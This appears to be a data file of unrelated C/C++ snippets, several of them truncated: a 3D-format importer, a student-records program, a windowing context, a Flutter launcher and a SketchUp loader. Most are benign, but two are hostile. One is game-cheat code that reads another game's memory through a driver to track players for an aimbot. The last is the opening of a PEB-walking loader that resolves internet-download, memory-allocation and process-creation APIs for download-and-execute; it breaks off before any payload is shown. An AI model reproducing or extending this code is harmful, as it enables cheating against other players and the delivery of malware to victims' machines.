LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n\n/** @file Implementation of the STL importer class */\n\n#ifndef ASSIMP_BUILD_NO_NFF_IMPORTER\n\n// internal headers\n#include \"NFFLoader.h\"\n#include <assimp/ParsingUtils.h>\n#include <assimp/RemoveComments.h>\n#include <assimp/StandardShapes.h>\n#include <assimp/fast_atof.h>\n#include <assimp/importerdesc.h>\n#include <assimp/qnan.h>\n#include <assimp/scene.h>\n#include <assimp/DefaultLogger.hpp>\n#include <assimp/IOSystem.hpp>\n#include <memory>\n\nnamespace Assimp {\n\nstatic constexpr aiImporterDesc desc = {\n    \"Neutral File Format Importer\",\n    \"\",\n    \"\",\n    \"\",\n    aiImporterFlags_SupportBinaryFlavour,\n    0,\n    0,\n    0,\n    0,\n    \"enff nff\"\n};\n\n// ------------------------------------------------------------------------------------------------\n// Returns whether the class can handle the format of the given file.\nbool NFFImporter::CanRead(const std::string & pFile, IOSystem * /*pIOHandler*/, bool /*checkSig*/) const {\n    return SimpleExtensionCheck(pFile, \"nff\", \"enff\");\n}\n\n// ------------------------------------------------------------------------------------------------\n// Get the list of all supported file extensions\nconst aiImporterDesc *NFFImporter::GetInfo() const {\n    return &desc;\n}\n\n// ------------------------------------------------------------------------------------------------\n#define AI_NFF_PARSE_FLOAT(f) \\\n    SkipSpaces(&sz, lineEnd);          \\\n    if (!IsLineEnd(*sz)) sz = fast_atoreal_move<ai_real>(sz, (ai_real &)f);\n\n// ------------------------------------------------------------------------------------------------\n#define AI_NFF_PARSE_TRIPLE(v) \\\n    AI_NFF_PARSE_FLOAT(v[0])   \\\n    AI_NFF_PARSE_FLOAT(v[1])   \\\n    AI_NFF_PARSE_FLOAT(v[2])\n\n// ------------------------------------------------------------------------------------------------\n#define AI_NFF_PARSE_SHAPE_INFORMATION()                     \\\n    aiVector3D center, radius(1.0f, get_qnan(), get_qnan()); \\\n    AI_NFF_PARSE_TRIPLE(center);                             \\\n    AI_NFF_PARSE_TRIPLE(radius);                             \\\n    if (is_qnan(radius.z)) radius.z = radius.x;              \\\n    if (is_qnan(radius.y)) radius.y = radius.x;              \\\n    curMesh.radius = radius;                                 \\\n    curMesh.center = center;\n\n// ------------------------------------------------------------------------------------------------\n#define AI_NFF2_GET_NEXT_TOKEN()                                            \\\n    do {                                                                    \\\n        if (!GetNextLine(buffer, line)) {                                   \\\n            ASSIMP_LOG_WARN(\"NFF2: Unexpected EOF, can't read next token\"); \\\n            break;                                                          \\\n        }                                                                   \\\n        SkipSpaces(line, &sz, lineEnd);                                              \\\n    } while (IsLineEnd(*sz))\n\n// ------------------------------------------------------------------------------------------------\n// Loads the material table for the NFF2 file format from an external file\nvoid NFFImporter::LoadNFF2MaterialTable(std::vector<ShadingInfo> &output,\n      ",
    "#include <iostream>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\n/*\r\n*****************************************************************************************************\r\n                                STUDENT RECORD MANAGMENT SYSTEM\r\n*****************************************************************************************************\r\n*/\r\n\r\n//  DECLARATIONS OF ALL THE FUNCTIONS USED IN THE PROGRAM\r\n\r\nvoid menu();\r\n\r\nint getwhattheywant();\r\n\r\nint input_int_from_user();\r\ndouble input_double_from_user();\r\n\r\nvoid writing_in_file();\r\nvoid write_trash_file();\r\n\r\nchar **regrow2(char **StudentName, int row);\r\ndouble **regrow(double **data, int &row);\r\nvoid add(double *arr, char *name, double **data, int row, int checkrow, ofstream &fout);\r\n\r\nvoid search_by_rollno(double **data, char **name, int row, int col);\r\n\r\nint search_for_record_to_delete(double **data, int row);\r\nvoid file_update(double **arr, char **name, int row);\r\n\r\nvoid update_a_record(double *data, double **check, int row, char *name, int key);\r\nvoid update_rollno(double *data, double **check, int key, int row);\r\nvoid update_name(char *name);\r\nvoid update_assignment(double *data);\r\nvoid update_quiz(double *data);\r\nvoid update_mids(double *data);\r\nvoid update_cgpa(double *data);\r\n\r\nvoid copyarr(char** &newarr, char** &StudentName, int row, int key);\r\nvoid copyarr_double(int delete_a_row, int row, double** &temp, double** &data);\r\nchar** dlt_a_charrecord(int delete_a_row, char** &StudentName, int row);\r\ndouble** dlt_a_datarecord(int delete_a_row, double** &data, int &row);\r\nvoid create_trash_file(double *arr, char *name);\r\n\r\nvoid show_detail(double* data, char* name);\r\n\r\nvoid HighestCGPA(double **data, char **name, int row, int col);\r\n\r\nvoid LowestCGPA(double **data, char **name, int row, int col);\r\n\r\nvoid marks_less_than_50(double **data, char **name, int row, int col);\r\n\r\nvoid read_from_file(ifstream &fin);\r\nvoid read_from_trashfile(ifstream &fin);\r\n\r\nvoid delete_memory(double **data, char **StudentName, int row);\r\n\r\n// MAIN FUNCTION\r\n\r\nint main()\r\n{\r\n\tdouble **data = NULL;\r\n\tchar **StudentName = NULL;\r\n\tint row = 0, col = 13;\r\n    ofstream fout;\r\n\r\n\twriting_in_file();\r\n\twrite_trash_file();\r\n\r\n\tcout << endl;\r\n\tcout << \"----------------------------------WELCOME TO STUDENT RECORD MANAGEMENT SYSTEM------------------------------\" << endl;\r\n\tcout << endl;\r\n\r\n\tmenu();\r\n\tint whattheywant = getwhattheywant();\r\n\r\n\r\n\twhile (whattheywant != 10)\r\n\t{\r\n\t\tswitch (whattheywant)\r\n\t\t{\r\n\t\tcase 1:\r\n\t\t{\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n            cout << \"                                             SELECTED OPTION 01                                            \" << endl;\r\n            cout << \"                                             ~ADD A NEW RECORD~                                            \" << endl;\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n\t\t\tStudentName = regrow2(StudentName, row);\r\n\t\t\tdata = regrow(data, row);\r\n\t\t\tadd(data[row - 1], StudentName[row - 1], data, row, row - 1, fout);\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tcase 2:\r\n\t\t{\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n            cout << \"                                             SELECTED OPTION 02                                           \" << endl;\r\n            cout << \"                                        ~SEARCH A RECORD BY ROLL NUMBER~                                            \" << endl;\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n\t\t\tsearch_by_rollno(data, StudentName, row, 0);\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tcase 3:\r\n\t\t{\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n            cout << \"                                             SELECTED OPTION 03                                            \" << endl;\r\n            cout << \"                                           ~TOTAL NUMBER OF STUDENTS~                                            \" << endl;\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n\t\t\tcout << \"Total Number of Students are: \" << row << endl;\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tcase 4:\r\n\t\t{\r\n            cout << \"***********************************************************************************************************\" << endl;\r\n            cout << \"                                             SELECTED OPTION 04                                            \" << endl;\r\n            cout << \"                                            ~UPDATE A STUDENT RECORD~                                            \" << endl;\r\n            cout << \"****************",
    "#include \"context.h\"\n#include \"../common/log.h\"\n#include \"imgui.h\"\n\n#define CLIENT_WIN_WIDTH 900\n#define CLIENT_WIN_HEIGHT 600\n\nstatic GLFWwindow *window;\n\ntypedef struct {\n    int key_index;\n    void (*callback)(int action_index);\n} KeyEventEntry;\n\nstatic KeyEventEntry *key_listeners = 0, *mouse_listeners = 0;\nstatic int key_listeners_count = 0, mouse_listeners_count = 0;\n\nstatic void key_callback(GLFWwindow *window, int key, int scancode, int action, int mods);\nstatic void mouse_button_callback(GLFWwindow *window, int button, int action, int mods);\n\nstatic void APIENTRY debug_callback(GLenum source, GLenum type, unsigned int id, GLenum severity,\n                                    GLsizei length, const char *message, const void *userParam);\n\nGLFWwindow *client::context::init() {\n    /**\n     * Ensuring the context has not been already initialized\n     */\n    if (window != NULL) fatal(\"Tried to init an already existing context!\");\n\n    /**\n     * Initializing GLFW and giving all the window hints\n     */\n    if (!glfwInit()) {\n        fatal(\"Failed to initialize GLFW\")\n    } else {\n        info(\"Initialized GLFW %d.%d\", GLFW_VERSION_MAJOR, GLFW_VERSION_MINOR)\n    }\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 6);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    glfwWindowHint(GLFW_OPENGL_DEBUG_CONTEXT, true);\n    glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE);\n\n    /**\n     * Creating the window\n     */\n    window = glfwCreateWindow(CLIENT_WIN_WIDTH, CLIENT_WIN_HEIGHT, \"iVy\", NULL, NULL);\n    if (window == NULL) {\n        glfwTerminate();\n        fatal(\"Failed to create GLFW window\");\n    }\n    glfwMakeContextCurrent(window);\n    glfwSwapInterval(0);\n\n    /**\n     * Initializing GLAD\n     */\n    int version = gladLoadGL(glfwGetProcAddress);\n    if (version == 0) {\n        fatal(\"Failed to initialize GLAD\");\n    } else {\n        info(\"Initialized OpenGL %d.%d\", GLAD_VERSION_MAJOR(version), GLAD_VERSION_MINOR(version));\n    }\n\n    /**\n     * Initializing the OpenGL debug context\n     */\n    int flags;\n    glGetIntegerv(GL_CONTEXT_FLAGS, &flags);\n    if (flags & GL_CONTEXT_FLAG_DEBUG_BIT) {\n        info(\"Enabled OpenGL debug output.\");\n        glEnable(GL_DEBUG_OUTPUT);\n        glEnable(GL_DEBUG_OUTPUT_SYNCHRONOUS);\n        glDebugMessageCallback(debug_callback, NULL);\n        glDebugMessageControl(GL_DONT_CARE, GL_DONT_CARE, GL_DONT_CARE, 0, NULL, GL_TRUE);\n    } else {\n        warn(\"Could not create OpenGL debug context, we are running blind!\");\n    }\n\n    /**\n     * registering key callbacks\n     */\n    glfwSetKeyCallback(window, key_callback);\n    glfwSetMouseButtonCallback(window, mouse_button_callback);\n\n    return window;\n}\n\nvoid client::context::terminate() {\n    glfwTerminate();\n}\n\nvoid client::context::register_key_callback(int key_index, void(*callback)(int action_index)) {\n    key_listeners = (KeyEventEntry *) realloc(key_listeners, (++key_listeners_count) * sizeof(KeyEventEntry));\n    key_listeners[key_listeners_count - 1] = KeyEventEntry{key_index, callback};\n}\n\nvoid client::context::register_mouse_callback(int button_index, void(*callback)(int action_index)) {\n    mouse_listeners = (KeyEventEntry *) realloc(mouse_listeners, (++mouse_listeners_count) * sizeof(KeyEventEntry));\n    mouse_listeners[mouse_listeners_count - 1] = KeyEventEntry{button_index, callback};\n}\n\nvoid client::context::toggle_fullscreen(){\n    static int prev_win_width, prev_win_height, win_x, win_y;\n    static bool is_fullscreen = false;\n    is_fullscreen = !is_fullscreen;\n    if (is_fullscreen) {\n        GLFWmonitor *monitor = glfwGetPrimaryMonitor();\n        const GLFWvidmode *mode = glfwGetVideoMode(monitor);\n        glfwGetWindowSize(window, &prev_win_width, &prev_win_height);\n        glfwGetWindowPos(window, &win_x, &win_y);\n        glfwSetWindowMonitor(window, monitor, 0, 0, mode->width, mode->height,\n                             mode->refreshRate);\n    } else {\n        glfwSetWindowMonitor(window, NULL, 0, 0, prev_win_width,\n                             prev_win_height,\n                             GLFW_DONT_CARE);\n        glfwSetWindowPos(window, win_x, win_y);\n    }\n}\n\nstatic void key_callback(GLFWwindow *_window, int key, int scancode, int action, int mods) {\n    ImGuiIO &io = ImGui::GetIO();\n    if(io.WantCaptureKeyboard) return;\n    for (int i = 0; i < key_listeners_count; i++) {\n        if (key == key_listeners[i].key_index) key_listeners[i].callback(action);\n    }\n}\n\nstatic void mouse_button_callback(GLFWwindow *_window, int button, int action, int mods) {\n    ImGuiIO &io = ImGui::GetIO();\n    if(io.WantCaptureMouse) return;\n    for (int i = 0; i < mouse_listeners_count; i++) {\n        if (button == mouse_listeners[i].key_index) mouse_listeners[i].callback(action);\n    }\n}\n\nstatic void APIENTRY debug_callback(GLenum source, GLenum type, unsigned int id, GLenum severity,\n                                    GLsizei length, const char *message, cons",
    "#include \"../Driver/Driver.h\"\n#include \"../Globals.h\"\n#include \"../Offsets.h\"\n#include \"../SDK/SDK.h\"\n#include <algorithm>\n#include <iterator>\n#include <thread>\n#include <chrono>\n\nstd::vector<APlayerState*> oldData{};\n\nCamera GetViewPoint()\n{\n\tCamera view_point{};\n\tuintptr_t location_pointer = Driver->read<uint64_t>((uint64_t)Globals::uWorld + 0x110);\n\tuintptr_t rotation_pointer = Driver->read<uint64_t>((uint64_t)Globals::uWorld + 0x120);\n\tFNRot fnrot{};\n\tfnrot.a = Driver->read<double>(rotation_pointer);\n\tfnrot.b = Driver->read<double>(rotation_pointer + 0x20);\n\tfnrot.c = Driver->read<double>(rotation_pointer + 0x1D0);\n\tview_point.location = Driver->read<Vector3>(location_pointer);\n\tview_point.rotation.x = asin(fnrot.c) * (180.0 / M_PI);\n\tview_point.rotation.y = ((atan2(fnrot.a * -1, fnrot.b) * (180.0 / M_PI)) * -1) * -1;\n\tview_point.fov = Driver->read<float>((uint64_t)Globals::localPlayerController + 0x394) * 90.f;\n\treturn view_point;\n}\n\nnamespace Threads {\n\tvoid ViewPoint() {\n\t\twhile (true) {\n\t\t\tGlobals::localCamera = GetViewPoint();\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(1)); //Remove sleep for ultra fast actorLoop but not needed this is fast enough\n\t\t}\n\t}\n\n\tvoid EntityCache() {\n\t\twhile (true) {\n\t\t\tGlobals::uWorld = Driver->read<UWorld*>(Globals::uWorldAddy);\n\t\t\tif (!Globals::uWorld) {\n\t\t\t\tprintf(\"UWorld not found!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tGlobals::gameInstance = Globals::uWorld->GetGameInstance();\n\t\t\tif (!Globals::gameInstance) {\n\t\t\t\tprintf(\"Game instance not found!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tGlobals::localPlayer = Globals::gameInstance->GetLocalPlayer();\n\t\t\tif (!Globals::localPlayer) {\n\t\t\t\tprintf(\"Local player not found!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tGlobals::localPlayerController = Globals::localPlayer->GetPlayerController();\n\t\t\tif (!Globals::localPlayerController) {\n\t\t\t\tprintf(\"Local player controller not found!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tGlobals::localPlayerPawn = Globals::localPlayerController->GetAPawn();\n\t\t\tif (!Globals::localPlayerPawn) {\n\t\t\t\tprintf(\"Local player pawn not found!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tGlobals::localPlayerPosition = Globals::localPlayerPawn->GetRelativeLocation();\n\n\t\t\tGlobals::gameState = Globals::uWorld->GetGameState();\n\t\t\tif (!Globals::gameState) {\n\t\t\t\tprintf(\"game state not found!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tGlobals::playerArray = Globals::gameState->GetPlayerArray();\n\t\t\tif (!Globals::playerArray.Num()) {\n\t\t\t\tprintf(\"Player array emtpy!\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tstd::vector<APlayerState*>newData(Globals::playerArray.Num());\n\t\t\tDriver->readArray<APlayerState*>(Globals::playerArray.GetAddress(), newData.data(), Globals::playerArray.Num());\n\t\t\tstd::sort(newData.begin(), newData.end());\n\n\t\t\tstd::vector<APlayerState*> removedPlayers;\n\t\t\tstd::set_difference(oldData.begin(), oldData.end(), newData.begin(), newData.end(), std::inserter(removedPlayers, removedPlayers.begin()));\n\n\t\t\tstd::vector<APlayerState*> newPlayers;\n\t\t\tstd::set_difference(newData.begin(), newData.end(), oldData.begin(), oldData.end(), std::inserter(newPlayers, newPlayers.begin()));\n\n\t\t\tprintf(\"New data size: %d\\n\", newData.size());\n\t\t\toldData = newData;\n\n\t\t\tfor (APlayerState* playerState : removedPlayers) {\n\t\t\t\tGlobals::playerCache.erase(playerState);\n\t\t\t}\n\n\t\t\tfor (APlayerState* playerState : newPlayers) {\n\t\t\t\tif (!playerState)\n\t\t\t\t\tcontinue;\n\n\t\t\t\tGlobals::playerCache[playerState].pointer = playerState;\n\t\t\t\tGlobals::playerCache[playerState].aPawn = playerState->GetAPawn();\n\n\t\t\t\tif (Globals::localPlayerPawn == Globals::playerCache[playerState].aPawn) {\n\t\t\t\t\tGlobals::playerCache.erase(playerState);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tGlobals::playerCache[playerState].mesh = Globals::playerCache[playerState].aPawn->GetSkeletalMeshComponent();\n\t\t\t}\n\n\t\t\tfor (auto& [key, player] : Globals::playerCache) {\n\t\t\t\tif (!player.aPawn)\n\t\t\t\t\tplayer.aPawn = player.pointer->GetAPawn();\n\n\t\t\t\tplayer.mesh = player.aPawn->GetSkeletalMeshComponent();\n\n\t\t\t\tplayer.relativeLocation = player.aPawn->GetRelativeLocation();\n\n\t\t\t\tplayer.headPosition = player.mesh->GetBoneById(110);\n\t\t\t\tplayer.rootPosition = player.mesh->GetBoneById(0);\n\n\t\t\t\tplayer.isVisible = player.mesh->IsVisible();\n\t\t\t}\n\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(1)); //Remove sleep for ultra fast actorLoop but not needed this is fast enough\n\n\t\t}\n\t}\n\n\tvoid Misc() {\n\t\twhile (true) {\n\n\t\t}\n\t}\n\n\tvoid Aimbot() {\n\t\twhile (true) {\n\n\t\t}\n\t}\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatbot\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"MeshSkpLoader.h\"\r\n#include \"Utils.h\"\r\n\r\nstd::map<std::string, int> matMap;\r\nSUMaterialRef MatREFT;\r\n\r\nstd::vector<Entity> ImportSkpMesh(const std::string& fileName, wi::scene::Scene& scene, const std::string& objName)\r\n{\r\n\tstd::vector<Entity> listOfEntity = {};\r\n\r\n    std::string directory = wi::helper::GetDirectoryFromPath(fileName);\r\n    std::string name = \"\";\r\n\r\n    if (!objName.empty())\r\n    {\r\n        name = objName;\r\n    }\r\n    else\r\n    {\r\n        name = wi::helper::GetFileNameFromPath(fileName);\r\n    }\r\n\r\n    //create the root entity\r\n    Entity rootEntity = wi::ecs::INVALID_ENTITY;\r\n    rootEntity = CreateEntity();\r\n    scene.transforms.Create(rootEntity);\r\n    scene.names.Create(rootEntity) = name;\r\n    scene.materials.Create(rootEntity);\r\n    listOfEntity.push_back(rootEntity);\r\n\r\n\tSUInitialize();\r\n\t//code for import here\r\n    SUModelRef model = SU_INVALID;\r\n    SUModelLoadStatus status;\r\n    SUResult res = SUModelCreateFromFileWithStatus(&model, fileName.data(), &status);\r\n\r\n    // Get the entity container of the model.\r\n    SUEntitiesRef entities = SU_INVALID;\r\n    SUModelGetEntities(model, &entities);\r\n\r\n    size_t numMaterials;\r\n    SUModelGetNumMaterials(model, &numMaterials);\r\n    std::vector<SUMaterialRef> materialsList(numMaterials);\r\n    SUModelGetMaterials(model, numMaterials, &materialsList[0], &numMaterials);\r\n\r\n    wi::scene::MaterialComponent* defaultMat = scene.materials.GetComponent(rootEntity);\r\n    if (defaultMat != nullptr)\r\n    {\r\n        defaultMat->SetDoubleSided(true);\r\n    }\r\n\r\n    matMap[\"DEFAULTORION\"] = rootEntity;\r\n\r\n    int inc = 0;\r\n    for (int i = 0; i < numMaterials;i++)\r\n    {\r\n        SUStringRef matName = SU_INVALID;\r\n        SUStringCreate(&matName);\r\n        SUMaterialGetName(materialsList.at(i), &matName);\r\n        std::string materialName = getStdStringFromSkpString(matName);\r\n        SUStringRelease(&matName);\r\n\r\n        wi::ecs::Entity matEntity = scene.Entity_CreateMaterial(materialName);\r\n        wi::scene::MaterialComponent* matWicked = scene.materials.GetComponent(matEntity);\r\n        matWicked->SetPreferUncompressedTexturesEnabled(true);\r\n\r\n        SUTextureRef texture = SU_INVALID;\r\n        SUResult result = SUMaterialGetTexture(materialsList.at(i), &texture);\r\n        if (result == SU_ERROR_NONE)\r\n        {\r\n            std::string fileTextureToLoad = \"temp/tex\" + Utils::intToStr(inc) + \".png\";\r\n            SUTextureWriteOriginalToFile(texture, fileTextureToLoad.data());\r\n\r\n            if (!wi::resourcemanager::Contains(fileTextureToLoad))\r\n            {\r\n                matWicked->textures[wi::scene::MaterialComponent::TEXTURESLOT::BASECOLORMAP].resource =\r\n                wi::resourcemanager::Load(fileTextureToLoad, wi::resourcemanager::Flags::NONE);\r\n            }\r\n\r\n            matWicked->textures[wi::scene::MaterialComponent::TEXTURESLOT::BASECOLORMAP].name = fileTextureToLoad;\r\n\r\n            inc++;\r\n        }\r\n\r\n        SUColor color = SU_INVALID;\r\n        double alpha = 1.0;\r\n        SUMaterialGetColor(materialsList.at(i), &color);\r\n        SUMaterialGetOpacity(materialsList.at(i), &alpha);\r\n        \r\n        matWicked->baseColor.x = color.red / 255.0f;\r\n        matWicked->baseColor.y = color.green / 255.0f;\r\n        matWicked->baseColor.z = color.blue / 255.0f;\r\n        matWicked->baseColor.w = (float)alpha;\r\n\r\n        matWicked->SetMetalness(0.1f);\r\n        matWicked->SetReflectance(0.0f);\r\n        matWicked->SetRoughness(0.5f);\r\n\r\n        if (alpha < 1.0)\r\n        {\r\n            matWicked->userBlendMode = wi::enums::BLENDMODE_ALPHA;\r\n            matWicked->SetMetalness(0.9f);\r\n            matWicked->SetReflectance(0.5f);\r\n            matWicked->SetRoughness(0.05f);\r\n        }\r\n        else\r\n        {\r\n            matWicked->userBlendMode = wi::enums::BLENDMODE_OPAQUE;\r\n        }\r\n\r\n        //matWicked->SetOpacity((float)alpha);\r\n        matWicked->SetSpecularColor(XMFLOAT4(1, 1, 1, 1));\r\n\r\n        //To avoid wrong face with skp model force double sided...Not really optimized...\r\n        matWicked->SetDoubleSided(true);\r\n\r\n        matWicked->SetDirty();\r\n\r\n        matMap[materialName] = matEntity;\r\n    }\r\n\r\n    SUTransformation transform = SU_INVALID;\r\n    initSkpMatrix(&transform);\r\n    SUMaterialRef materialGroup = SU_INVALID;\r\n    SUMaterialRef materialInstance = SU_INVALID;\r\n    SUMaterialRef materialLayer = SU_INVALID;\r\n\r\n    readSurfaceFromSkp(entities, transform, scene, rootEntity, listOfEntity);\r\n\r\n    //compute bbox\r\n    wi::primitive::AABB drawingAabb;\r\n\r\n    wi::unordered_set<wi::ecs::Entity> allEntities;\r\n    scene.FindAllEntities(allEntities);\r\n\r\n    for (auto itr = allEntities.begin(); itr != allEntities.end(); ++itr)\r\n    {\r\n        wi::ecs::Entity entityIt = *itr;\r\n\r\n        wi::scene::HierarchyComponent* hier = scene.hierarchy.GetComponent(entityIt);\r\n        if (hier != nullptr)\r\n        {\r\n            if (hier->parentID == rootEntity)\r\n            {\r\n                wi::scene::MeshComponent* mesh = scene.meshes",
    "// header\n#include \"common.hpp\"\n\n// std\n#include <ctime>\n\nstd::filesystem::path get_timestamp_filename() {\n  auto now = std::chrono::system_clock::now();\n  std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n  std::string timestamp = std::to_string(now_c);\n  return timestamp + \".dat\";\n}\n\nstd::string get_human_readable_timestamp(const std::string &filename) {\n  std::time_t timestamp =\n      std::stol(filename.substr(0, filename.find_first_of('.')));\n  std::tm *local_time = std::localtime(&timestamp);\n  char buffer[64];\n  std::strftime(buffer, sizeof(buffer), \"%d-%m-%Y %H:%M:%S\", local_time);\n  return buffer;\n}\n\nstd::vector<std::filesystem::path>\nget_file_list(const std::filesystem::path &directory) {\n  std::vector<std::filesystem::path> file_list{};\n\n  if (!std::filesystem::exists(directory)) {\n    return file_list;\n  }\n\n  for (const auto &entry : std::filesystem::directory_iterator(directory)) {\n    if (std::filesystem::is_regular_file(entry)) {\n      file_list.push_back(entry.path());\n    }\n  }\n  return file_list;\n}\n\nstd::vector<std::string>\nget_human_readable_file_list(const std::filesystem::path &directory) {\n  std::vector<std::string> file_list{};\n\n  for (const auto &entry : get_file_list(directory)) {\n    file_list.push_back(\n        get_human_readable_timestamp(entry.filename().string()));\n  }\n  return file_list;\n}\n\nvoid create_dir(const std::filesystem::path &directory) {\n  // Check if the directory exists\n  if (!std::filesystem::exists(directory)) {\n    // Create the directory\n    (std::filesystem::create_directory(directory));\n  }\n}",
    "\ufeff#include <windows.h>\r\n#include \"peb.h\"\r\n\r\n#define INTERNET_OPEN_TYPE_DIRECT 1\r\n#define INTERNET_FLAG_RELOAD 0x80000000\r\n\r\ntypedef HANDLE(WINAPI* CreateFileA_Func)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);\r\ntypedef BOOL(WINAPI* WriteFile_Func)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);\r\ntypedef BOOL(WINAPI* CloseHandle_Func)(HANDLE);\r\ntypedef BOOL(WINAPI* CreateProcessA_Func)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\r\ntypedef HMODULE(WINAPI* LoadLibraryA_Func)(LPCSTR);\r\ntypedef BOOL(WINAPI* FreeLibrary_Func)(HMODULE);\r\ntypedef DWORD(WINAPI* GetEnvironmentVariableA_Func)(LPCSTR, LPSTR, DWORD);\r\ntypedef int(WINAPI* wsprintfA_Func)(LPSTR, LPCSTR, ...);\r\ntypedef LPVOID(WINAPI* InternetOpenA_Func)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);\r\ntypedef LPVOID(WINAPI* InternetOpenUrlA_Func)(LPVOID, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);\r\ntypedef BOOL(WINAPI* InternetReadFile_Func)(LPVOID, LPVOID, DWORD, LPDWORD);\r\ntypedef BOOL(WINAPI* InternetCloseHandle_Func)(LPVOID);\r\ntypedef LPVOID(WINAPI* VirtualAlloc_Func)(LPVOID, SIZE_T, DWORD, DWORD);\r\n\r\ntypedef struct {\r\n    CreateFileA_Func CreateFileA;\r\n    WriteFile_Func WriteFile;\r\n    CloseHandle_Func CloseHandle;\r\n    CreateProcessA_Func CreateProcessA;\r\n    LoadLibraryA_Func LoadLibraryA;\r\n    FreeLibrary_Func FreeLibrary;\r\n    GetEnvironmentVariableA_Func GetEnvironmentVariableA;\r\n    wsprintfA_Func wsprintfA;\r\n    InternetOpenA_Func InternetOpenA;\r\n    InternetOpenUrlA_Func InternetOpenUrlA;\r\n    InternetReadFile_Func InternetReadFile;\r\n    InternetCloseHandle_Func InternetCloseHandle;\r\n    VirtualAlloc_Func VirtualAlloc;\r\n} Win32Funcs;\r\n\r\nBOOL ResolveWin32Functions(Win32Funcs* funcs)\r\n{\r\n    WCHAR kernel32_dll_name[] = L\"kernel32.dll\";\r\n    HMODULE hKernel32 = (HMODULE)get_module_by_name(kernel32_dll_name);\r\n    if (!hKernel32)\r\n        return FALSE;\r\n\r\n    funcs->CreateFileA = (CreateFileA_Func)get_func_by_name(hKernel32, \"CreateFileA\");\r\n    funcs->WriteFile = (WriteFile_Func)get_func_by_name(hKernel32, \"WriteFile\");\r\n    funcs->CloseHandle = (CloseHandle_Func)get_func_by_name(hKernel32, \"CloseHandle\");\r\n    funcs->CreateProcessA = (CreateProcessA_Func)get_func_by_name(hKernel32, \"CreateProcessA\");\r\n    funcs->LoadLibraryA = (LoadLibraryA_Func)get_func_by_name(hKernel32, \"LoadLibraryA\");\r\n    funcs->FreeLibrary = (FreeLibrary_Func)get_func_by_name(hKernel32, \"FreeLibrary\");\r\n    funcs->GetEnvironmentVariableA = (GetEnvironmentVariableA_Func)get_func_by_name(hKernel32, \"GetEnvironmentVariableA\");\r\n    funcs->VirtualAlloc = (VirtualAlloc_Func)get_func_by_name(hKernel32, \"VirtualAlloc\");\r\n\r\n    HMODULE hUser32 = funcs->LoadLibraryA(\"user32.dll\");\r\n    if (!hUser32)\r\n        return FALSE;\r\n\r\n    funcs->wsprintfA = (wsprintfA_Func)get_func_by_name(hUser32, \"wsprintfA\");\r\n\r\n    HMODULE hWinINet = funcs->LoadLibraryA(\"wininet.dll\");\r\n    if (!hWinINet)\r\n        return FALSE;\r\n\r\n    funcs->InternetOpenA = (InternetOpenA_Func)get_func_by_name(hWinINet, \"InternetOpenA\");\r\n    funcs->InternetOpenUrlA = (InternetOpenUrlA_Func)get_func_by_name(hWinINet, \"InternetOpenUrlA\");\r\n    funcs->InternetReadFile = (InternetReadFile_Func)get_func_by_name(hWinINet, \"InternetReadFile\");\r\n    